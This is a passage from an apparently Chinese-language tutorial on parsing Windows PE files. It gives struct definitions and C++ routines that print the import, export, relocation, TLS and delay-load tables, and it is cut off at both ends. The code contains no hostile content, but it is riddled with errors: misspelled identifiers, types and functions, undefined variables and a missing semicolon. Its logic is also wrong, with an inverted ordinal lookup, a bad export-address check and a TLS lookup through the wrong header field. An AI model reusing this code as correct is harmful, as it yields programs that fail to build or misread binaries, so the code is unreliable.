class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">PrintImportTable</span><span class="params">(<span class="type">char</span>* buffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// DOS 头</span></span><br><span class="line">    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer;</span><br><span class="line">    <span class="comment">// NT 头</span></span><br><span class="line">    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + buffer);</span><br><span class="line">    <span class="comment">// 定位导入表</span></span><br><span class="line">    PIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)(pNtHeader-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_IMPORT);</span><br><span class="line">    <span class="comment">// 填充结构体</span></span><br><span class="line">    PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)(<span class="built_in">RVAToFOV</span>(pData.Dir.VirtualAddress, buffer) + buffer);</span><br><span class="line">    <span class="keyword">while</span>(pImport-&gt;Name)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span>* szDllName = (<span class="type">char</span>*)(<span class="built_in">RVAToFOA</span>(pImport-&gt;Name, buffer) + buffer);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;DllName: %s\n&quot;</span>, szDllName);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;TimeDateStamp：%08x\n&quot;</span>, pImport-&gt;TimeDateStamp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ForwarderChain：%08x\n&quot;</span>, pImport-&gt;ForwarderChain);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name Offset：%08x\n&quot;</span>, pImport-&gt;Name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;FirstThunk：%08x\n&quot;</span>, pImport-&gt;FirstThunk);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;OriginalFirstThunk：%08x\n\n&quot;</span>, pImport-&gt;OriginalFirstThunk);</span><br><span class="line"></span><br><span class="line">        PIMAGE_THUNK_DATA pIAT = (PIMAGE_THUNK_DATA)(<span class="built_in">RVAToFOA</span>(pImport-&gt;FirstThunk, buffer) + buffer);</span><br><span class="line">        <span class="keyword">while</span>(pIAT-&gt;u1.Ordinal != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="built_in">IMAGE_SNAP_BY_ORDINAL32</span>(pIAT-&gt;u1.Ordinal))</span><br><span class="line">            &#123;</span><br><span class="line">                PIMAGE_IMPORT_BY_NAME pFunctionName = (PIMAGE_IMPORT_BY_NAME)(<span class="built_in">RVAToFOA</span>(pIAT-&gt;u1.AddressOfData, buffer) + buffer);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Function Name: %s\n&quot;</span>, pFunctionName);</span><br><span class="line">            &#125;</span><br><span class="line">            pIAT++;</span><br><span class="line">        &#125;</span><br><span class="line">        pImport++</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="IMAGE-EXPORT-DIRECTORY-导出表"><a href="#IMAGE-EXPORT-DIRECTORY-导出表" class="headerlink" title="_IMAGE_EXPORT_DIRECTORY(导出表)"></a>_IMAGE_EXPORT_DIRECTORY(导出表)</h2><h3 id="IMAGE-EXPORT-DIRECTORY结构体"><a href="#IMAGE-EXPORT-DIRECTORY结构体" class="headerlink" title="IMAGE_EXPORT_DIRECTORY结构体"></a>IMAGE_EXPORT_DIRECTORY结构体</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_EXPORT_DIRECTORY</span> &#123;</span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   Base;</span><br><span class="line">    DWORD   NumberOfFunctions;</span><br><span class="line">    DWORD   NumberOfNames;</span><br><span class="line">    DWORD   AddressOfFunctions;     <span class="comment">// RVA from base of image</span></span><br><span class="line">    DWORD   AddressOfNames;         <span class="comment">// RVA from base of image</span></span><br><span class="line">    DWORD   AddressOfNameOrdinals;  <span class="comment">// RVA from base of image</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><div class="note message"><p><strong>IMAGE_EXPORT_DIRECTORY</strong></p><ul><li><code>Characteristics</code>: 保留，必须为0</li><li><code>TimeDateStamp</code>: 时间戳</li><li><code>MajorVersion</code>: 主要版本号，主要和次要版本号可由用户设置</li><li><code>MinorVersion</code>: 次要版本号</li><li><code>Name</code>: 名称RVA，包含导出文件名称的ASCII字符串地址</li><li><code>Base</code>: 此映像中导出的起始序号，指定导出地址表（AddressOfFunctions）的起始序号，通常设置为1</li><li><code>NumberOfFunctions</code>: 导出函数的个数，导出地址表（AddressOfFunctions）中的条目数</li><li><code>NumberOfNames</code>: 按名称导出的函数个数，名称表（AddressOfFunctions）中的条目数，同样也是序号表（AddressOfNameOrdinals）中的条目数</li><li><code>AddressOfFunctions</code>: 导出地址表RVA</li><li><code>AddressOfNames</code>: 导出名称表RVA</li><li><code>AddressOfNameOrdinals</code>: 序号表RVA</li></ul></div><h3 id="解析导出表"><a href="#解析导出表" class="headerlink" title="解析导出表"></a>解析导出表</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintExportTable</span><span class="params">(<span class="type">char</span>* buffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// DOS</span></span><br><span class="line">    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer;</span><br><span class="line">    <span class="comment">// NT</span></span><br><span class="line">    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + buffer);</span><br><span class="line">    <span class="comment">// 定位导出表</span></span><br><span class="line">    PINAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)(pNtHeader-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT);</span><br><span class="line">    <span class="comment">// 填充结构体</span></span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(<span class="built_in">RVAToFOA</span>(pDataDir-&gt;VirtualAddress, buffer) + buffer);</span><br><span class="line">    <span class="keyword">if</span> (pExport-&gt;AddressFunctions == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;当前没有导出表!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span>* szDllName = (<span class="type">char</span>*)(<span class="built_in">RVAToFOA</span>(pExport-&gt;Name, buffer) + buffer);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;DllName: %s\n&quot;</span>, DllName);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Base: %#08x\n&quot;</span>, pExport-&gt;Base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;NumberOfFunctions: %#08x\n&quot;</span>, pExport-&gt;NumberOfFunctions);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;NumberOfNames: %#08x\n&quot;</span>, pExport-&gt;NumberOfNames);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;AddressOfFunctions: %#08x\n&quot;</span>, pExport-&gt;AddressOfFunctions);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;AddressOfNames: %#08x\n&quot;</span>, pExport-&gt;AddressOfNames);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;AddressOfNameOrdinals: %#08x\n&quot;</span>, pExport-&gt;AddressOfNameOrdinals);</span><br><span class="line">    <span class="comment">// 函数数量</span></span><br><span class="line">    DWORD dwNumberOfFunctions = pExport-&gt;NumberOfFunctions;</span><br><span class="line">    <span class="comment">// 函数名数量</span></span><br><span class="line">    DWORD dwNumberOfNames = pExport-&gt;NumberOfNames;</span><br><span class="line">    <span class="comment">// Base</span></span><br><span class="line">    DWORD dwBase = pExport-&gt;Base;</span><br><span class="line">    <span class="comment">// 导出地址表</span></span><br><span class="line">    PDWORD pExportAddrTable = (PDWORD)(<span class="built_in">RVAToFOA</span>(pExport-&gt;AddressOfFunctions, buffer) + buffer);</span><br><span class="line">    <span class="comment">// 导出名称表</span></span><br><span class="line">    PDWORD pExportNameTable = (PDWORD)(<span class="built_in">RVAToFOA</span>(pExport-&gt;AddressOfNames, buffer) + buffer);</span><br><span class="line">    <span class="comment">// 导出序号表</span></span><br><span class="line">    PWORD pExportIdTable = (PWORD)(<span class="built_in">RVAToFOA</span>(pExport-&gt;AddressOfNameOrdinals, buffer) + buffer);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; dwNumberOfFunctions; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(pExportAddrTable[i] == i)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        DWORD id = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (; id &lt; dwNumberOfNames; id++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(pExportIdTable[i] == id) </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (id == dwNumberOfNames)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ID: %x Address: %#08x Name[NULL]\n&quot;</span>, i + dwBase, pExportAddrTable[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">char</span>* szFunName = (<span class="type">char</span>*)(<span class="built_in">RVAToFileOffset</span>(pExportNameTable[id], buffer) + buffer);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ID: %x Address: %#08x Name[%s]\n&quot;</span>, i + dwBase, pExportAddrTable[i], szFunName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="IMAGE-BASE-RELOCATION-重定位表"><a href="#IMAGE-BASE-RELOCATION-重定位表" class="headerlink" title="_IMAGE_BASE_RELOCATION(重定位表)"></a>_IMAGE_BASE_RELOCATION(重定位表)</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_BASE_RELOCATION</span> &#123;</span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   SizeOfBlock;</span><br><span class="line"><span class="comment">//  WORD    TypeOffset[1];</span></span><br><span class="line">&#125; IMAGE_BASE_RELOCATION;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION;</span><br></pre></td></tr></table></figure><div class="note message"><p><strong>_IMAGE_BASE_RELOCATION</strong></p><ul><li><code>VirtualAddress</code>: 指向需要重定位地址的RVA，每个INAGE_BASE_RELOCATION只负责4kb大小分页内的重定位信息。因此结构中的VirtualAddress值为0x1000的倍数</li><li><code>SizeOfBlock</code>: imageBase结构体和TypeOffset的总和 重定位块的大小</li><li><code>TypeOffset[1]</code>: 自定义的一个字段，表示这个结构体下面会出现WORD类型的数组，该数组元素的就是硬编码在程序当中的偏移</li></ul><hr><p>自定义TypeOffset结构<br>typedef struct _TYPE<br>{<br>    WORD Offset: 12;    &#x2F;&#x2F; 大小2bit重定位的偏移<br>    WORD Type: 4;<br>} TYPE, *PTYPE;</p></div><div class="note warning"><p><strong>Windows的PE装载器进行PE重定位处理的操作原理流程</strong></p><ol><li>在应用程序当中查找硬编码位置</li><li>读取之后减去ImageBase，也就是用VA - 基址 &#x3D; RVA</li><li>加上实际加载地址得到真正的VA</li></ol><hr><p>其中最关键的就是找到硬编码的位置，而要找到硬编码的位置，首先要找到基址重定位表，该表位于.reloc区段，找到基址重定位表的正确打开方式是通过数据目录表<code>IMAGE_DATA_DIRECTORY</code>条目查找</p></div><h3 id="解析重定位表"><a href="#解析重定位表" class="headerlink" title="解析重定位表"></a>解析重定位表</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintBaseRelocTable</span><span class="params">(<span class="type">char</span>* buffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 自定义TypeOffset结构</span></span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_TYPE</span>&#123;</span><br><span class="line">        WORD Offset: <span class="number">12</span>;</span><br><span class="line">        WORD Type: <span class="number">4</span>;</span><br><span class="line">    &#125; TYPE, *PTYPE;</span><br><span class="line">    <span class="comment">// DOS</span></span><br><span class="line">    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer;</span><br><span class="line">    <span class="comment">// NT</span></span><br><span class="line">    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + buffer);</span><br><span class="line">    <span class="comment">// SECTION Header</span></span><br><span class="line">    PIMAGE_SECTION_HEADER pSectionHeader = <span class="built_in">IMAGE_FIRSET_SECTION</span>(pNtHeader);</span><br><span class="line">    <span class="comment">// 定位重定位表</span></span><br><span class="line">    PIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)(pNtHeader-&gt;OptionalHeader.DataDirtory + IMAGE_DIRECTORY_ENTRY_BASERELOC);</span><br><span class="line">    <span class="comment">// 填充结构体</span></span><br><span class="line">    PIMAGE_BASE_RELOCATION pBaseReloc = (PIMAGE_BASE_RELOCATION)(<span class="built_in">RVAToFOA</span>(pDataDir-&gt;VirtualAddress, buffer) + buffer);</span><br><span class="line">    <span class="keyword">while</span>(pBaseReloc-&gt;SizeOfBlock != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 找到本0x1000个字节的起始位置</span></span><br><span class="line">        <span class="comment">// 重定位个数 = （SizeOfBlock - 8（IMAGE_BASE_RELOCATION）） / 2（每个TypeOffset是2个字节）</span></span><br><span class="line">        DWORD dwCount = (DWORD)(pBaseReloc-&gt;SizeOfBlock - <span class="number">8</span>) / <span class="number">2</span>;</span><br><span class="line">        DWORD dwRVA = pBaseReloc-&gt;VirtualAddres;</span><br><span class="line">        PTYPE pRelocAddr = (PTYPE)(pBaseReloc + <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;SECTION: %#08X\n&quot;</span>, pSectionHeader-&gt;Name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;RVA: %#08X\n&quot;</span>, dwRVA);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ITEMS: %x H / %d D\n&quot;</span>, pBaseReloc-&gt;SizeOfBlock, pBaseReloc-&gt;SizeOfBlock);</span><br><span class="line">        <span class="comment">// 找到下一个0x1000个字节</span></span><br><span class="line">        pBaseReloc = (PIMAGE_BASE_RELOCATION)((<span class="type">char</span>*)pBaseReloc + pBaseReloc-&gt;SizeOfBlock);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; dwCount; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            PDWORD pData = (PDWORD)(<span class="built_in">RVAToFOA</span>(pRelocAddr[i].Offset + dwRVA, buffer) + buffer);</span><br><span class="line">            DWORD pDataOffset = <span class="built_in">RVAToFOA</span>(pRelocAddr[i].Offset + dwRVA, buffer);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;SECTION: %#08x\n&quot;</span>, *pData);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;RVA: %#08x\n&quot;</span>, pRelocAddr[i].Offset + dwRVA);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;OFFSET: %#08x\n\n&quot;</span>, pDataOffset);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="IMAGE-TLS-DIRECTORY-TLS表"><a href="#IMAGE-TLS-DIRECTORY-TLS表" class="headerlink" title="_IMAGE_TLS_DIRECTORY(TLS表)"></a>_IMAGE_TLS_DIRECTORY(TLS表)</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_TLS_DIRECTORY32</span> &#123;</span><br><span class="line">    DWORD   StartAddressOfRawData;</span><br><span class="line">    DWORD   EndAddressOfRawData;</span><br><span class="line">    DWORD   AddressOfIndex;             <span class="comment">// PDWORD</span></span><br><span class="line">    DWORD   AddressOfCallBacks;         <span class="comment">// PIMAGE_TLS_CALLBACK *</span></span><br><span class="line">    DWORD   SizeOfZeroFill;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        DWORD Characteristics;</span><br><span class="line">        <span class="keyword">struct</span> &#123;</span><br><span class="line">            DWORD Reserved0 : <span class="number">20</span>;</span><br><span class="line">            DWORD Alignment : <span class="number">4</span>;</span><br><span class="line">            DWORD Reserved1 : <span class="number">8</span>;</span><br><span class="line">        &#125; DUMMYSTRUCTNAME;</span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line"></span><br><span class="line">&#125; IMAGE_TLS_DIRECTORY32;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_TLS_DIRECTORY32 * PIMAGE_TLS_DIRECTORY32;</span><br></pre></td></tr></table></figure><div class="note message"><p><strong>_IMAGE_TLS_DIRECTORY32</strong></p><ul><li><code>StartAddressOfRawData</code>: TLS初始化数据起始地址</li><li><code>EndAddressOfRawData</code>: TLS初始化结束地址，两个正好定位一个范围，范围放初始化的值</li><li><code>AddressOfIndex</code>: TLS索引位置</li><li><code>AddressOfCallBacks</code>: TLS回调函数的数组指针</li><li><code>SizeOfZeroFill</code>: 填充0的个数</li><li><code>Characteristics</code>: 保留</li></ul><hr><p>TLS: 线程本地存储器，可以将数据与执行的特定线程联系起来。怎么理解？</p><ol><li>如果一个变量是全局的，那么所有线程访问的是同一份，某一个线程对其修改会影响其他所有线程。如果我们需要一个变量在每个线程中都能访问，并且值在每个线程中互不影响，这就是TLS。</li><li>线程局部存储在不同平台有不同的实现，可移植性不好。线程局部存储不难实现，最简单的办法就是建立一个全局表，通过当前线程ID去查询相应的数据，因为各个线程ID不同，查到的数据自然也不同。</li></ol></div><h3 id="解析TLS表"><a href="#解析TLS表" class="headerlink" title="解析TLS表"></a>解析TLS表</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintTLSTable</span><span class="params">(<span class="type">char</span>* buffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// DOS</span></span><br><span class="line">    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer;</span><br><span class="line">    <span class="comment">// NT</span></span><br><span class="line">    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + buffer);</span><br><span class="line">    <span class="comment">// 定位TLS表</span></span><br><span class="line">    PIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)(pNtHeader-&gt;OptionalHeader.VirtualAddres + IMAGE_DIRECTORY_ENTRY_TLS);</span><br><span class="line">    <span class="comment">// 填充结构体</span></span><br><span class="line">    PIMAGE_TLS_DIRECTORY pTLS = (PIMAGE_TLS_DIRECTORY)(<span class="built_in">RVAToFOA</span>(pDataDir-&gt;VirtualAddress, buffer) + buffer);</span><br><span class="line">    <span class="built_in">prinf</span>(<span class="string">&quot;StartAddressOfRawData: %#08x\n&quot;</span>, pTLS-&gt;StartAddressOfRawData);</span><br><span class="line">    <span class="built_in">prinf</span>(<span class="string">&quot;EndAddressOfRawData: %#08x\n&quot;</span>, pTLS-&gt;EndAddressOfRawData);</span><br><span class="line">    <span class="built_in">prinf</span>(<span class="string">&quot;AddressOfIndex: %#08x\n&quot;</span>, pTLS-&gt;AddressOfIndex);</span><br><span class="line">    <span class="built_in">prinf</span>(<span class="string">&quot;AddressOfCallBacks: %#08x\n&quot;</span>, pTLS-&gt;AddressOfCallBacks);</span><br><span class="line">    <span class="built_in">prinf</span>(<span class="string">&quot;SizeOfZeroFill: %#08x\n&quot;</span>, pTLS-&gt;SizeOfZeroFill);</span><br><span class="line">    <span class="built_in">prinf</span>(<span class="string">&quot;Characteristics: %#08x\n&quot;</span>, pTLS-&gt;Characteristics);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="IMAGE-DELAYLOAD-DESCRIPTOR-延时加载表"><a href="#IMAGE-DELAYLOAD-DESCRIPTOR-延时加载表" class="headerlink" title="_IMAGE_DELAYLOAD_DESCRIPTOR(延时加载表)"></a>_IMAGE_DELAYLOAD_DESCRIPTOR(延时加载表)</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_DELAYLOAD_DESCRIPTOR</span> &#123;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        DWORD AllAttributes;</span><br><span class="line">        <span class="keyword">struct</span> &#123;</span><br><span class="line">            DWORD RvaBased : <span class="number">1</span>;             <span class="comment">// Delay load version 2</span></span><br><span class="line">            DWORD ReservedAttributes : <span class="number">31</span>;</span><br><span class="line">        &#125; DUMMYSTRUCTNAME;</span><br><span class="line">    &#125; Attributes;</span><br><span class="line"></span><br><span class="line">    DWORD DllNameRVA;                       <span class="comment">// RVA to the name of the target library (NULL-terminate ASCII string)</span></span><br><span class="line">    DWORD ModuleHandleRVA;                  <span class="comment">// RVA to the HMODULE caching location (PHMODULE)</span></span><br><span class="line">    DWORD ImportAddressTableRVA;            <span class="comment">// RVA to the start of the IAT (PIMAGE_THUNK_DATA)</span></span><br><span class="line">    DWORD ImportNameTableRVA;               <span class="comment">// RVA to the start of the name table (PIMAGE_THUNK_DATA::AddressOfData)</span></span><br><span class="line">    DWORD BoundImportAddressTableRVA;       <span class="comment">// RVA to an optional bound IAT</span></span><br><span class="line">    DWORD UnloadInformationTableRVA;        <span class="comment">// RVA to an optional unload info table</span></span><br><span class="line">    DWORD TimeDateStamp;                    <span class="comment">// 0 if not bound,</span></span><br><span class="line">                                            <span class="comment">// Otherwise, date/time of the target DLL</span></span><br><span class="line"></span><br><span class="line">&#125; IMAGE_DELAYLOAD_DESCRIPTOR, *PIMAGE_DELAYLOAD_DESCRIPTOR;</span><br></pre></td></tr></table></figure><h3 id="解析延时加载表"><a href="#解析延时加载表" class="headerlink" title="解析延时加载表"></a>解析延时加载表</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// DOS</span></span><br><span class="line">PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer;</span><br><span class="line"><span class="comment">// NT</span></span><br><span class="line">PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pDosHeader-&gt;e_lfanew + buffer);</span><br><span class="line"><span class="comment">// 定位DelayImportTable</span></span><br><span class="line">PIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)(pNtHeader-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT);</span><br><span class="line"><span class="comment">// 填充结构体</span></span><br><span class="line">PIMAGE_DELAYLOAD_DESCRIPTOR pDelayLoad = (PIMAGE_DELAYLOAD_DESCRIPTOR)(<span class="built_in">RVAToFileOffset</span>(pDataDir-&gt;VirtualAddress, buffer) + buffer);</span><br><span class="line"><span class="type">char</span>* szDllName = (<span class="type">char</span>*)(<span class="built_in">RVAToFileOffset</span>(pDelayLoad-&gt;DllNameRVA, buffer) + buffer);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, szDllName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Attributes: %#08x\n&quot;</span>, pDelayLoad-&gt;Attributes);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ModuleHandleRVA: %#08x\n&quot;</span>, pDelayLoad-&gt;ModuleHandleRVA);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ImportAddressTableRVA: %#08x\n&quot;</span>, pDelayLoad-&gt;ImportAddressTableRVA);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ImportNameTableRVA: %#08x\n&quot;</span>, 